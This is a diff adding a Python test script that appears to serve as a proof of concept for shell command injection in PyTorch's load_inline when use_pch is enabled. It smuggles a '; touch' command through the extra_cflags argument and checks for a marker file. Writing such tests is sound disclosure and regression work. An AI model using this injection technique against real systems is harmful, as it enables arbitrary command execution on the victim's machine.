@@ -1,0 +1,66 @@
+import os
+import tempfile
+import torch
+from torch.utils.cpp_extension import load_inline
+
+def test_command_injection_via_pch():
+    """
+    Test case to verify OS command injection vulnerability in 
+    torch.utils.cpp_extension.load_inline when use_pch=True.
+    
+    The vulnerability allows arbitrary command execution via shell metacharacters
+    in extra_cflags due to subprocess.check_output(..., shell=True).
+    """
+    
+    # Create a temporary directory for the build and the exploit marker
+    with tempfile.TemporaryDirectory() as tmpdir:
+        # Define a marker file that will be created if the injection is successful
+        marker_file = os.path.join(tmpdir, "exploit_success.txt")
+        
+        # Minimal C++ source code required for the extension
+        cpp_source = """
+        #include <torch/extension.h>
+        torch::Tensor add(torch::Tensor x, torch::Tensor y) {
+            return x + y;
+        }
+        PYBIND11_MODULE(TORCH_EXTENSION_NAME, m) {
+            m.def("add", &add, "Add two tensors");
+        }
+        """
+
+        # Construct the malicious payload.
+        # We inject a shell command separator ';' followed by a command to create a file.
+        # The '#' at the end comments out the rest of the compiler arguments to prevent syntax errors
+        # that might stop execution before the shell command runs.
+        payload = f"; touch {marker_file} #"
+
+        print(f"Attempting to inject command to create {marker_file}...")
+
+        try:
+            # Call the API with the trigger (use_pch=True) and the vector (extra_cflags)
+            load_inline(
+                name="test_injection_module",
+                cpp_sources=cpp_source,
+                extra_cflags=[payload],
+                build_directory=tmpdir,
+                use_pch=True,  # This flag enables the vulnerable code path
+                verbose=False
+            )
+        except Exception as e:
+            # The compilation is expected to fail because the injected payload
+            # breaks the compiler's argument list. However, if shell=True is used,
+            # the command before the comment might still execute.
+            print(f"Compilation failed (expected due to malformed flags): {e}")
+
+        # Verification: Check if the file was created
+        if os.path.exists(marker_file):
+            print(f"VULNERABILITY CONFIRMED: Arbitrary command executed. File '{marker_file}' created.")
+            return True
+        else:
+            print(f"Test passed: File '{marker_file}' was not created. The vulnerability may be fixed.")
+            return False
+
+if __name__ == "__main__":
+    # Note: This test requires a C++ compiler and PyTorch development dependencies.
+    # It is designed to run against a vulnerable version of PyTorch (>= 2.1).
+    test_command_injection_via_pch()
